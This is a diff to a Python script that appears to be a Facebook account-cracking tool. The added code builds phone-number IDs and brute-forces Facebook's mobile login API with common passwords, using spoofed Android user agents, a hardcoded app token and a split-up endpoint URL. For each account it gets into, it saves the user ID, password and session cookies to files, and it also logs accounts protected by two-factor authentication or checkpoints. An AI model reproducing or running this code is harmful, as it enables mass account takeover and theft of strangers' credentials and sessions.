@@ -229,4 +229,57 @@ def rmenu1():
 		print(f'\033[10;92m┏━\033[10;97m=============================================')
 		print("\033[10;92m┣━\033[10;97m[\033[10;92m+\033[10;97m]\x1b[38;5;208m USER NAME\033[10;91m :\033[10;96m "+NameX)
 		print(f'{R}┣━{W}[{G}+{W}] {R}YOUR TOTAL ID :{G} {tid}{W}')
-		
+		#print (f'\033[10;92m┣━{W}[{G}+{W}] \033[10;93mYOUR SIM CODE : \033[1;92m'+code)
+		print(f'\033[10;92m┣━\033[10;97m[\033[10;92m+\033[10;97m]\033[10;92m Started Time Date \033[10;91m: \033[10;93m{dateti}')
+		print(f'\033[10;92m┣━\033[10;97m[\033[10;92m+\033[10;97m] \x1b[38;5;208mUSE YOUR \033[10;95mAIRPLANE MODE \033[10;97m[\033[10;92mON\033[10;91m/\033[10;92mOFF\033[10;97m] \033[10;92mAFTER\033[10;91m-\033[10;92m3 MIN')
+		print(f'\033[10;92m┗━\033[10;97m=============================================')
+		#print(f"\033[10;97m[\033[10;92m+\033[10;97m]\x1b[38;5;208m USER NAME\033[10;91m :\033[10;96m "+NameX)
+		for rngx in xode:
+			id=code+rngx
+			if "1" in rcd:psd=[id,rngx,id[:6],id[:7],id[:8],id[5:]]
+			if "2" in rcd:psd=[id,rngx,id[5:],"Bangladesh','bangladesh','Bangla','bangla','I LOVE YOU','i love you','@@@###','@#@#@#','###@@@','১২৩৪৫৬৭৮','sadiya','sumaiya','jannatul','00998877','113355','mababa','১২৩৪৫৬৭','sabbir','aabbcc','abbuammu','sumiya','১২৩৪৫৬৭৮৯"]
+			if "3" in rcd:psd=[id,rngx,id[:6],"bangladesh"]
+			tonxoys.submit(graphrm,id,psd,tid)
+			#Bangladesh','bangladesh','Bangla','bangla','I LOVE YOU','i love you','@@@###','@#@#@#','###@@@','১২৩৪৫৬৭৮','sadiya','sumaiya','jannatul','00998877','113355','mababa','১২৩৪৫৬৭','sabbir','aabbcc','abbuammu','sumiya','১২৩৪৫৬৭৮৯']
+lk=[]
+def graphrm(id,psd,tid):
+	global ok,cp,lk,lop
+	togg=[]
+	sys.stdout.write(f'\r\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;97m[\033[10;92mTutul\033[10;97m-\033[10;92mM1\033[10;97m]>~[\033[10;92m{lop}\033[10;97m]>~<[\033[10;92m{tid}\033[10;97m]>~[\033[10;92mOK\033[10;91m•\033[10;92m%s\033[10;91m/\033[10;93m%s\033[10;97m] '%(len(ok),len(lk)));sys.stdout.flush()
+	#sys.stdout.write(f'\r\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;97m[\033[10;92mTutul\033[10;97m-\033[10;92mM1\033[10;97m]>~[\033[10;92m{lop}\033[10;97m]>~<[\033[10;92m{tid}\033[10;97m]>~[\033[10;92mOK:%s\033[10;97m]>~<[\033[10;95mCp:%s\033[10;97m] '%(len(ok),len(lk)));sys.stdout.flush()
+	for psw in psd:
+		vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150));VAPP = random.randint(410000000,499999999);gtt=random.choice(xxxxx);gttt=random.choice(xxxxx)
+		#ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {str(gtt)} Build/R16NW).{random.randint(111111,999999)}.{random.randint(111,999)}) '+"[FBAN/FB4A;FBAV/196.0.0.29.99;FBBV/135374479;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/859351995;FBCR/Airtel/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A720F;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:;]"
+		ua = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77))+";FBBV/"+str(random.randint(1111111,7777777))+";Dalvik/2.1.0 (Linux; U; Android 14; Infinix X669 Build/UP1A.231005.007; wv) [FBAN/Orca-Android;FBAV/418.0.0.6.105;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/588686349;FBCR/NTA;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X669;FBSV/14;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2436};FB_FW/1;]"
+		datax= {'adid': str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'email': id,'password': psw,'generate_analytics_claims': '1', 'community_id': '','cpl': 'true','try_num': '1','family_device_id': str(uuid.uuid4()),'credentials_type': 'password','source': 'login','error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false','generate_session_cookies': '1','generate_machine_id': '1','currently_logged_in_userid': '0','locale': 'en_GB','client_country_code': 'GB', 'fb_api_req_friendly_name': 'authenticate'}
+		header={'User-Agent': ua,'Accept-Encoding':  'gzip, deflate','Accept': '*/*', 'Connection': 'keep-alive','Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate','X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),'X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'unknown','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'}
+		twfx= 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+		lo=requests.post('https://'+'b-gr'+'ap'+'h'+'.facebook.com/auth/login',data=datax,headers=header,allow_redirects=False).json()
+		if 'session_key' in lo:
+			cki = lo["session_cookies"]
+			ck={}
+			for xk in cki:ck.update({xk["name"]:xk["value"]})
+			coki = (";").join([ "%s=%s" % (key, value) for key, value in ck.items() ])
+			iid= re.findall('c_user=(.*);xs', coki)[0]
+			print(f'\r\r\033[10;92m[Rahim-Ok💚] {iid} | {psw} \033[10;91m•> \033[10;92m{rahimx(iid)}');os.system('espeak -a 300 "Rahim,  Ok,  id"');ok.append(id);open('/sdcard/1T-OK.txt', 'a').write(iid+' | '+psw+' | '+id+'  ------------>>>'+coki+"\n")
+			if 'y' in cokix:print(f'\r\r\033[10;93m[🌺] \033[10;91m= \033[10;93mCOOKIES\033[10;91m •  \033[10;94m{coki}{E}');print(f"\033[10;97m{47*'='}{E}")
+			break
+		elif twfx in str(lo):
+			iid = lo['error']['error_data']['uid']
+			print(f'\r\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;96m[Rahim-2F] {iid} | {psw}{W}');os.system('espeak -a 300 "2F"');open('/sdcard/1T-2F.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+			twf.append(id)
+			break
+		elif 'www.facebook.com' in lo['error']['message']:
+			try:
+				iid = lo['error']['error_data']['uid']
+			except:
+				iid=id
+			if iid in ok:pass
+			else:
+				if 'y' in cpx:
+					print(f'\r\r\033[10;97m[\033[10;92m=\033[10;97m]\033[10;91m~\033[10;93m[Rahim-Cp] {iid} | {psw}{W}');cp.append(id);os.system('espeak -a 300 "Cp"');open('/sdcard/1T-CP.txt', 'a').write(iid+' | '+psw+' | '+id+"\n")
+			break
+		else:continue
+	lop+=1
+#Main()
+apvroval.check()
